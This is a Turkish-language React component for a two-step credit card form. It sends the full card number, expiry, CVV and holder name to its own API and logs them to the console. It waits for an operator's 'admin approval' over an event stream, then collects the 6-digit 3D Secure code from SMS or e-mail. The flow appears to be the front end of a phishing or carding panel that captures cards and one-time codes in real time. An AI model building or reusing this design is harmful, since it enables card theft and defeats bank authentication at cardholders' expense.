"use client"

import type React from "react"
import { useState, useEffect } from "react"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { AlertCircle, CheckCircle } from "lucide-react"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"

export default function KrediKartiFormu() {
  const [kartNumarasi, setKartNumarasi] = useState("")
  const [sonKullanmaTarihi, setSonKullanmaTarihi] = useState("")
  const [cvv, setCvv] = useState("")
  const [adSoyad, setAdSoyad] = useState("")
  const [dogrulamaKodu, setDogrulamaKodu] = useState("")
  const [dogrulamaTipi, setDogrulamaTipi] = useState("sms")
  const [hatalar, setHatalar] = useState<{ [key: string]: string }>({})
  const [asamaBir, setAsamaBir] = useState(true)
  const [kartBilgileriDogrulandi, setKartBilgileriDogrulandi] = useState(false)
  const [gonderildiMi, setGonderildiMi] = useState(false)
  const [islemId, setIslemId] = useState<string | null>(null)
  const [islemDurumu, setIslemDurumu] = useState<string | null>(null)

  useEffect(() => {
    if (islemId) {
      const eventSource = new EventSource(`/api/transactions/${islemId}?stream=true`)

      eventSource.onmessage = (event) => {
        const data = JSON.parse(event.data)
        setIslemDurumu(data.status)
        if (data.status === "onaylandı") {
          setAsamaBir(false)
          setKartBilgileriDogrulandi(true)
        }
      }

      return () => eventSource.close()
    }
  }, [islemId])

  const kartBilgileriniDogrula = () => {
    const yeniHatalar: { [key: string]: string } = {}
    if (kartNumarasi.replace(/\s/g, "").length !== 16) {
      yeniHatalar.kartNumarasi = "Kart numarası 16 haneli olmalıdır"
    }
    if (!/^\d{2}\/\d{2}$/.test(sonKullanmaTarihi)) {
      yeniHatalar.sonKullanmaTarihi = "Son kullanma tarihi AA/YY formatında olmalıdır"
    }
    if (cvv.length !== 3) {
      yeniHatalar.cvv = "CVV 3 haneli olmalıdır"
    }
    if (adSoyad.trim().length === 0) {
      yeniHatalar.adSoyad = "Ad Soyad gereklidir"
    }
    setHatalar(yeniHatalar)
    return Object.keys(yeniHatalar).length === 0
  }

  const dogrulamaKoduDogrula = () => {
    const yeniHatalar: { [key: string]: string } = {}
    if (dogrulamaKodu.length !== 6) {
      yeniHatalar.dogrulamaKodu = "Doğrulama kodu 6 haneli olmalıdır"
    }
    setHatalar(yeniHatalar)
    return Object.keys(yeniHatalar).length === 0
  }

  const kartBilgileriGonder = async (e: React.FormEvent) => {
    e.preventDefault()
    if (kartBilgileriniDogrula()) {
      try {
        console.log("İstek gönderiliyor:", { kartNumarasi, sonKullanmaTarihi, adSoyad, cvv })
        const response = await fetch("/api/transactions", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            kartNumarasi,
            sonKullanmaTarihi,
            adSoyad,
            cvv,
          }),
        })

        console.log("Sunucu yanıtı:", response.status, response.statusText)
        const responseData = await response.json()
        console.log("Yanıt verisi:", responseData)

        if (!response.ok) {
          throw new Error(responseData.error || `HTTP hatası! durum: ${response.status}`)
        }

        if (!responseData.success || !responseData.transaction) {
          throw new Error("Geçersiz sunucu yanıtı: " + JSON.stringify(responseData))
        }

        setIslemId(responseData.transaction.id)
        setIslemDurumu("beklemede")
      } catch (error) {
        console.error("İşlem kaydedilirken hata oluştu:", error)
        setHatalar((prev) => ({
          ...prev,
          submit: error instanceof Error ? error.message : "Bilinmeyen bir hata oluştu",
        }))
      }
    }
  }

  const dogrulamaKoduGonder = async (e: React.FormEvent) => {
    e.preventDefault()
    if (dogrulamaKoduDogrula() && islemId) {
      try {
        const response = await fetch(`/api/transactions/${islemId}`, {
          method: "PUT",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            dogrulamaTipi,
            dogrulamaKodu,
            status: "tamamlandı",
          }),
        })

        if (!response.ok) {
          throw new Error("İşlem güncellenemedi")
        }

        setGonderildiMi(true)
      } catch (error) {
        console.error("İşlem güncellenirken hata oluştu:", error)
      }
    }
  }

  const kartNumarasiniFormatla = (deger: string) => {
    const v = deger.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
    const parcalar = []
    for (let i = 0; i < v.length; i += 4) {
      parcalar.push(v.slice(i, i + 4))
    }
    return parcalar.join(" ")
  }

  const kartNumarasiDegistir = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatliDeger = kartNumarasiniFormatla(e.target.value)
    setKartNumarasi(formatliDeger)
  }

  const sonKullanmaTarihiFormatla = (deger: string) => {
    const v = deger.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
    if (v.length >= 2) {
      return `${v.slice(0, 2)}/${v.slice(2, 4)}`
    }
    return v
  }

  const sonKullanmaTarihiDegistir = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatliDeger = sonKullanmaTarihiFormatla(e.target.value)
    setSonKullanmaTarihi(formatliDeger)
  }

  return (
    <div className="w-full max-w-md mx-auto">
      <h1 className="text-2xl font-bold text-center mb-6">Kredi Kartı Bilgileri</h1>

      {asamaBir ? (
        <form onSubmit={kartBilgileriGonder} className="space-y-4">
          <div>
            <Label htmlFor="kartNumarasi">Kart Numarası</Label>
            <Input
              id="kartNumarasi"
              value={kartNumarasi}
              onChange={kartNumarasiDegistir}
              placeholder="1234 5678 9012 3456"
              maxLength={19}
            />
            {hatalar.kartNumarasi && <p className="text-red-500 text-sm mt-1">{hatalar.kartNumarasi}</p>}
          </div>

          <div>
            <Label htmlFor="sonKullanmaTarihi">Son Kullanma Tarihi</Label>
            <Input
              id="sonKullanmaTarihi"
              value={sonKullanmaTarihi}
              onChange={sonKullanmaTarihiDegistir}
              placeholder="AA/YY"
              maxLength={5}
            />
            {hatalar.sonKullanmaTarihi && <p className="text-red-500 text-sm mt-1">{hatalar.sonKullanmaTarihi}</p>}
          </div>

          <div>
            <Label htmlFor="cvv">CVV</Label>
            <Input
              id="cvv"
              type="password"
              value={cvv}
              onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
              placeholder="123"
              maxLength={3}
            />
            {hatalar.cvv && <p className="text-red-500 text-sm mt-1">{hatalar.cvv}</p>}
          </div>

          <div>
            <Label htmlFor="adSoyad">Kart Sahibinin Adı Soyadı</Label>
            <Input
              id="adSoyad"
              value={adSoyad}
              onChange={(e) => setAdSoyad(e.target.value)}
              placeholder="Ahmet Yılmaz"
            />
            {hatalar.adSoyad && <p className="text-red-500 text-sm mt-1">{hatalar.adSoyad}</p>}
          </div>

          <Button type="submit" className="w-full">
            Devam Et
          </Button>
        </form>
      ) : (
        <form onSubmit={dogrulamaKoduGonder} className="space-y-4">
          {kartBilgileriDogrulandi && (
            <div className="flex items-center text-green-500 mb-4">
              <CheckCircle className="mr-2" />
              <span>Kart bilgileri doğrulandı</span>
            </div>
          )}

          <Card className="mb-4">
            <CardContent className="pt-6">
              <div className="space-y-2">
                <p>
                  <strong>Kart Numarası:</strong> {kartNumarasi}
                </p>
                <p>
                  <strong>Son Kullanma Tarihi:</strong> {sonKullanmaTarihi}
                </p>
                <p>
                  <strong>Ad Soyad:</strong> {adSoyad}
                </p>
              </div>
            </CardContent>
          </Card>

          <div>
            <Label className="text-base font-semibold">3D Doğrulama Yöntemi</Label>
            <RadioGroup value={dogrulamaTipi} onValueChange={setDogrulamaTipi} className="flex space-x-4 mt-2">
              <div className="flex items-center space-x-2">
                <RadioGroupItem value="sms" id="sms" />
                <Label htmlFor="sms">SMS</Label>
              </div>
              <div className="flex items-center space-x-2">
                <RadioGroupItem value="email" id="email" />
                <Label htmlFor="email">E-posta</Label>
              </div>
            </RadioGroup>
          </div>

          <div>
            <Label htmlFor="dogrulamaKodu">6 Haneli Doğrulama Kodu</Label>
            <Input
              id="dogrulamaKodu"
              value={dogrulamaKodu}
              onChange={(e) => setDogrulamaKodu(e.target.value.replace(/\D/g, "").slice(0, 6))}
              placeholder="123456"
              maxLength={6}
            />
            {hatalar.dogrulamaKodu && <p className="text-red-500 text-sm mt-1">{hatalar.dogrulamaKodu}</p>}
          </div>

          <Button type="submit" className="w-full">
            Gönder
          </Button>
        </form>
      )}

      {islemDurumu && (
        <Card className="mt-6">
          <CardContent className="pt-6">
            <h2 className="text-lg font-semibold mb-2 flex items-center">
              <AlertCircle className="mr-2 h-5 w-5 text-yellow-500" />
              İşlem Durumu
            </h2>
            <p className="text-sm text-gray-600">
              {islemDurumu === "beklemede"
                ? "İşleminiz admin onayı bekliyor..."
                : islemDurumu === "onaylandı"
                  ? "İşleminiz onaylandı. Lütfen 3D doğrulama kodunu girin."
                  : "İşleminiz tamamlandı."}
            </p>
          </CardContent>
        </Card>
      )}

      {gonderildiMi && (
        <Card className="mt-6">
          <CardContent className="pt-6">
            <h2 className="text-lg font-semibold mb-2 flex items-center">
              <AlertCircle className="mr-2 h-5 w-5 text-yellow-500" />
              Gönderilen Bilgiler
            </h2>
            <div className="space-y-2">
              <p>
                <strong>Kart Numarası:</strong> {kartNumarasi}
              </p>
              <p>
                <strong>Son Kullanma Tarihi:</strong> {sonKullanmaTarihi}
              </p>
              <p>
                <strong>Ad Soyad:</strong> {adSoyad}
              </p>
              <p>
                <strong>Doğrulama Yöntemi:</strong> {dogrulamaTipi === "sms" ? "SMS" : "E-posta"}
              </p>
              <p>
                <strong>Doğrulama Kodu:</strong> {dogrulamaKodu}
              </p>
            </div>
          </CardContent>
        </Card>
      )}
    </div>
  )
}

